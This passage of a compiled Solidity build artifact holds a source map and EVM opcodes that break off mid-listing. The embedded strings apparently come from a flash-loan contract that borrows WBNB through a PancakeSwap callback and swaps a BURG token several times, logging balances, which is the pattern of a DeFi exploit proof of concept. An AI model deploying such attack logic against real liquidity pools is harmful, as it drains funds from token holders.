;;;;;;;;;;;12376:55:0;;;12461:51:3;12528:18;;;12521:34;;;-1:-1:-1;;;;;12376:24:0;;;;;12434:18:3;;12376:55:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;12480:16:0;;;12494:1;12480:16;;;12442:21;12480:16;;;;;12442:21;12480:16;;;;;;;;;;-1:-1:-1;12480:16:0;12473:23;;12517:8;12507:4;12512:1;12507:7;;;;;;;;:::i;:::-;;;;;;:18;-1:-1:-1;;;;;12507:18:0;;;-1:-1:-1;;;;;12507:18:0;;;;;12545:9;12535:4;12540:1;12535:7;;;;;;;;:::i;:::-;-1:-1:-1;;;;;12535:19:0;;;:7;;;;;;;;;;;:19;12565:247;;-1:-1:-1;;;12565:247:0;;-1:-1:-1;;;;;;;;;;;526:42:0;12565:104;;:247;;12687:8;;12713:9;;12740:4;;12762:3;;12783:15;;12565:247;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12303:516;12102:717;;;;;:::o;14:131:3:-;-1:-1:-1;;;;;89:31:3;;79:42;;69:70;;135:1;132;125:12;69:70;14:131;:::o;150:863::-;247:6;255;263;271;279;332:3;320:9;311:7;307:23;303:33;300:53;;;349:1;346;339:12;300:53;388:9;375:23;407:31;432:5;407:31;:::i;:::-;457:5;-1:-1:-1;509:2:3;494:18;;481:32;;-1:-1:-1;560:2:3;545:18;;532:32;;-1:-1:-1;615:2:3;600:18;;587:32;638:18;668:14;;;665:34;;;695:1;692;685:12;665:34;733:6;722:9;718:22;708:32;;778:7;771:4;767:2;763:13;759:27;749:55;;800:1;797;790:12;749:55;840:2;827:16;866:2;858:6;855:14;852:34;;;882:1;879;872:12;852:34;927:7;922:2;913:6;909:2;905:15;901:24;898:37;895:57;;;948:1;945;938:12;895:57;150:863;;;;-1:-1:-1;150:863:3;;-1:-1:-1;979:2:3;971:11;;1001:6;150:863;-1:-1:-1;;;150:863:3:o;1018:315::-;1086:6;1094;1147:2;1135:9;1126:7;1122:23;1118:32;1115:52;;;1163:1;1160;1153:12;1115:52;1202:9;1189:23;1221:31;1246:5;1221:31;:::i;:::-;1271:5;1323:2;1308:18;;;;1295:32;;-1:-1:-1;;;1018:315:3:o;1338:251::-;1408:6;1461:2;1449:9;1440:7;1436:23;1432:32;1429:52;;;1477:1;1474;1467:12;1429:52;1509:9;1503:16;1528:31;1553:5;1528:31;:::i;:::-;1578:5;1338:251;-1:-1:-1;;;1338:251:3:o;3337:127::-;3398:10;3393:3;3389:20;3386:1;3379:31;3429:4;3426:1;3419:15;3453:4;3450:1;3443:15;3469:127;3530:10;3525:3;3521:20;3518:1;3511:31;3561:4;3558:1;3551:15;3585:4;3582:1;3575:15;3601:461;3654:3;3692:5;3686:12;3719:6;3714:3;3707:19;3745:4;3774:2;3769:3;3765:12;3758:19;;3811:2;3804:5;3800:14;3832:1;3842:195;3856:6;3853:1;3850:13;3842:195;;;3921:13;;-1:-1:-1;;;;;3917:39:3;3905:52;;3977:12;;;;4012:15;;;;3953:1;3871:9;3842:195;;;-1:-1:-1;4053:3:3;;3601:461;-1:-1:-1;;;;;3601:461:3:o;4067:332::-;4274:6;4263:9;4256:25;4317:2;4312;4301:9;4297:18;4290:30;4237:4;4337:56;4389:2;4378:9;4374:18;4366:6;4337:56;:::i;:::-;4329:64;4067:332;-1:-1:-1;;;;4067:332:3:o;4404:1105::-;4499:6;4530:2;4573;4561:9;4552:7;4548:23;4544:32;4541:52;;;4589:1;4586;4579:12;4541:52;4622:9;4616:16;4651:18;4692:2;4684:6;4681:14;4678:34;;;4708:1;4705;4698:12;4678:34;4746:6;4735:9;4731:22;4721:32;;4791:7;4784:4;4780:2;4776:13;4772:27;4762:55;;4813:1;4810;4803:12;4762:55;4842:2;4836:9;4864:2;4860;4857:10;4854:36;;;4870:18;;:::i;:::-;4916:2;4913:1;4909:10;4948:2;4942:9;5011:2;5007:7;5002:2;4998;4994:11;4990:25;4982:6;4978:38;5066:6;5054:10;5051:22;5046:2;5034:10;5031:18;5028:46;5025:72;;;5077:18;;:::i;:::-;5113:2;5106:22;5163:18;;;5197:15;;;;-1:-1:-1;5239:11:3;;;5235:20;;;5267:19;;;5264:39;;;5299:1;5296;5289:12;5264:39;5323:11;;;;5343:135;5359:6;5354:3;5351:15;5343:135;;;5425:10;;5413:23;;5376:12;;;;5456;;;;5343:135;;;5497:6;4404:1105;-1:-1:-1;;;;;;;;4404:1105:3:o;5722:184::-;5792:6;5845:2;5833:9;5824:7;5820:23;5816:32;5813:52;;;5861:1;5858;5851:12;5813:52;-1:-1:-1;5884:16:3;;5722:184;-1:-1:-1;5722:184:3:o;6891:422::-;7121:2;7103:21;;;7160:2;7140:18;;;7133:30;7199:26;7194:2;7179:18;;7172:54;7293:4;7278:20;;7271:36;;;;7258:3;7243:19;;6891:422::o;12566:127::-;12627:10;12622:3;12618:20;12615:1;12608:31;12658:4;12655:1;12648:15;12682:4;12679:1;12672:15;12698:135;12737:3;12758:17;;;12755:43;;12778:18;;:::i;:::-;-1:-1:-1;12825:1:3;12814:13;;12698:135::o;13747:168::-;13787:7;13853:1;13849;13845:6;13841:14;13838:1;13835:21;13830:1;13823:9;13816:17;13812:45;13809:71;;;13860:18;;:::i;:::-;-1:-1:-1;13900:9:3;;13747:168::o;13920:217::-;13960:1;13986;13976:132;;14030:10;14025:3;14021:20;14018:1;14011:31;14065:4;14062:1;14055:15;14093:4;14090:1;14083:15;13976:132;-1:-1:-1;14122:9:3;;13920:217::o;14142:128::-;14182:3;14213:1;14209:6;14206:1;14203:13;14200:39;;;14219:18;;:::i;:::-;-1:-1:-1;14255:9:3;;14142:128::o;14554:277::-;14621:6;14674:2;14662:9;14653:7;14649:23;14645:32;14642:52;;;14690:1;14687;14680:12;14642:52;14722:9;14716:16;14775:5;14768:13;14761:21;14754:5;14751:32;14741:60;;14797:1;14794;14787:12;16444:839;16675:6;16664:9;16657:25;16638:4;16701:2;16739:6;16734:2;16723:9;16719:18;16712:34;16811:1;16807;16802:3;16798:11;16794:19;16786:6;16782:32;16777:2;16766:9;16762:18;16755:60;16851:3;16846:2;16835:9;16831:18;16824:31;16884:6;16878:13;16928:6;16922:3;16911:9;16907:19;16900:35;16953:1;16963:141;16977:6;16974:1;16971:13;16963:141;;;17073:14;;;17069:23;;17063:30;17038:17;;;17057:3;17034:27;17027:67;16992:10;;16963:141;;;17122:6;17119:1;17116:13;17113:92;;;17193:1;17187:3;17178:6;17167:9;17163:22;17159:32;17152:43;17113:92;-1:-1:-1;17266:2:3;17245:15;-1:-1:-1;;17241:29:3;17226:45;;;;17273:3;17222:55;;16444:839;-1:-1:-1;;;;;;16444:839:3:o;17288:574::-;17579:6;17568:9;17561:25;17622:6;17617:2;17606:9;17602:18;17595:34;17665:3;17660:2;17649:9;17645:18;17638:31;17542:4;17686:57;17738:3;17727:9;17723:19;17715:6;17686:57;:::i;:::-;-1:-1:-1;;;;;17779:32:3;;;;17774:2;17759:18;;17752:60;-1:-1:-1;17843:3:3;17828:19;17821:35;17678:65;17288:574;-1:-1:-1;;;17288:574:3:o",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "offset": [
    419,
    12856
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x84800812 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0x9D9E465C EQ PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x45 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0x54 CALLDATASIZE PUSH1 0x4 PUSH2 0x2B97 JUMP JUMPDEST PUSH2 0x7B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x67 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0x76 CALLDATASIZE PUSH1 0x4 PUSH2 0x2C2D JUMP JUMPDEST PUSH2 0x26E4 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xDFE1681 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDF SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x121 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x145 SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xE6A43905 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x4 DUP4 ADD MSTORE DUP3 AND PUSH1 0x24 DUP3 ADD MSTORE SWAP1 SWAP2 POP PUSH1 0x0 SWAP1 PUSH20 0xCA143CE32FE78F1F7019D7D551A6402FC5350C73 SWAP1 PUSH4 0xE6A43905 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1AB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1CF SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND EQ PUSH2 0x225 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x4E6F742061207061697220636F6E747261637421 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND ADDRESS EQ PUSH2 0x267 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x7 PUSH1 0x24 DUP3 ADD MSTORE PUSH7 0x10B9B2B73232B9 PUSH1 0xC9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x21C JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x276 DUP7 DUP9 ADD DUP9 PUSH2 0x2C2D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP2 DUP2 MSTORE PUSH1 0x13 DUP2 DUP4 ADD MSTORE PUSH19 0x436F6E74726163742062616C616E6365206973 PUSH1 0x68 SHL PUSH1 0x60 DUP3 ADD MSTORE SELFBALANCE PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP5 POP SWAP1 SWAP3 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG1 PUSH1 0x40 DUP1 MLOAD PUSH1 0x2 DUP1 DUP3 MSTORE PUSH1 0x60 DUP1 DUP4 ADD DUP5 MSTORE PUSH10 0x43C25E0DCC1BD1C0000 SWAP4 SWAP1 SWAP3 SWAP2 SWAP1 PUSH1 0x20 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x317 JUMPI PUSH2 0x317 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE POP POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x359 JUMPI PUSH2 0x359 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x20 SWAP3 DUP4 MUL SWAP2 SWAP1 SWAP2 ADD SWAP1 SWAP2 ADD MSTORE PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x60 SWAP1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x3A7 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x3C4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x3EC SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x447 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x46B SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4CE SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x33 SWAP1 DUP3 ADD MSTORE PUSH32 0x57424E422062616C616E6365206F6620636F6E74726163742061667465722072 PUSH1 0x60 DUP3 ADD MSTORE PUSH19 0x32B1B2B4BB3B34B73390333630B9B43637B0B7 PUSH1 0x69 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x4F8 JUMPI PUSH2 0x4F8 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x549 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x2B SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH11 0x10212AA923903A37B5B2B7 PUSH1 0xA9 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x5A7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5CB SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5D8 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x624 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x657 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x674 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x69C SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x6C0 JUMPI PUSH2 0x6C0 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x723 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722031737420737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x781 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x7A5 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7B2 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x7EE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x821 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x83E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x866 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x88A JUMPI PUSH2 0x88A PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x8ED SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E20616674657220326E6420737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x94B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x96F SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x97C SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x9B8 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x9EB SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA08 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 